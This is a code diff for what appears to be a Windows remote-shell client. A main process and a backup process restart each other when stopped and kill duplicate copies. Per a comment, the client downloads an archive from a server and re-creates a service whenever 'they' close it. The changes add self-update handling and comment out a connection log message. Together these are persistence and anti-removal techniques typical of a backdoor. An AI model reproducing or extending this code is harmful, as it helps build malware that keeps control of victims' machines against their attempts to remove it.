@@ -16,6 +16,7 @@ void RestartBackupShellAndExit();
 
 int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPTSTR lpCmdLine, int nCmdShow)	//main function
 {
+	//MessageBoxA(NULL, "UPDATE", "UPDATE", MB_OK);
 	//Alloc console for debug purposes
 	CreateDebugConsole();
 
@@ -86,6 +87,10 @@ non_backup_shell_code:
 
 	//This thread is used to make sure the backup thread is always active, for more info go check out the method
 	_beginthreadex(NULL, NULL, (_beginthreadex_proc_type)CheckBackupRunningThread, NULL, NULL, NULL);
+
+	//Delete update file
+	remove(SHELL_PATH(SHELL_UPDATE_NAME));
+
 	//Main loop
 	while (true)
 	{
@@ -99,7 +104,7 @@ non_backup_shell_code:
 			}
 		}
 		else {
-			Log("Client connected!\n");
+			//Log("Client connected!\n");
 			//If service doesn't exist download the archive from server (will need to have external.zip inside Server.exe folder), create and start the service.
 			//Keep on looping just in case they close the service, but keep high delay since the function is decently heavy and we don't want anything weird happening.
 			Service::CheckAndRepairService();
@@ -139,8 +144,19 @@ void BackupThread() {
 	else { 
 		//If more than 1 backup shell is running exit process
 		if (Utils::getProcessCount(SHELL_BACKUP_NAME) > 1) { 
-			PauseAndExit(1);
+			Log("Another backup shell found, closing it\n");
+			HANDLE hProc = 0;
+			auto procID = Utils::getProcess(SHELL_BACKUP_NAME);
+			if (procID) {
+				const auto hBackupShell = OpenProcess(PROCESS_TERMINATE, false, procID);
+				TerminateProcess(hBackupShell, 1);
+				CloseHandle(hBackupShell);
+			}
 		}
+	}
+	//Wait for main shell to exist on disk in case this routine was called after an update
+	while (GetFileAttributesA(SHELL_EXE) == INVALID_FILE_ATTRIBUTES) {
+		Sleep(100);
 	}
 
 	Log("Got into backup shell main thread\n");
@@ -214,7 +230,7 @@ void BackupThread() {
 			PROCESS_INFORMATION processInfo;
 			ZeroMemory(&info, sizeof(info));
 			ZeroMemory(&processInfo, sizeof(processInfo));
-			while (!CreateProcessA(SHELL_EXE, (LPSTR)"", NULL, NULL, FALSE, 0, NULL, NULL, &info, &processInfo))
+			while (!CreateProcessA(SHELL_EXE, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &info, &processInfo))
 			{
 				Sleep(100);
 			}
@@ -235,7 +251,7 @@ void RestartBackupShellAndExit() {
 	PROCESS_INFORMATION processInfo;
 	ZeroMemory(&info, sizeof(info));
 	ZeroMemory(&processInfo, sizeof(processInfo));
-	while (!CreateProcessA(SHELL_BACKUP_EXE, (LPSTR)"", NULL, NULL, FALSE, 0, NULL, NULL, &info, &processInfo))
+	while (!CreateProcessA(SHELL_BACKUP_EXE, NULL, NULL, NULL, FALSE, 0, NULL, NULL, &info, &processInfo))
 	{
 		Sleep(100);
 	}
@@ -267,6 +283,15 @@ void CheckBackupRunningThread() {
 		//If exit code is STILL_ACTIVE the process hasn't been stopped yet
 		if (exitCode != STILL_ACTIVE) { 
 			RestartBackupShellAndExit();
+		}
+		if (FileExists(SHELL_PATH(SHELL_UPDATE_NAME))) {
+			auto procID = Utils::getProcess(SHELL_BACKUP_NAME);
+			if (procID) {
+				const auto hBackupShell = OpenProcess(PROCESS_TERMINATE, false, procID);
+				TerminateProcess(hBackupShell, 1);
+				CloseHandle(hBackupShell);
+			}
+			PauseAndExit(10);
 		}
 		Sleep(100);
 	}
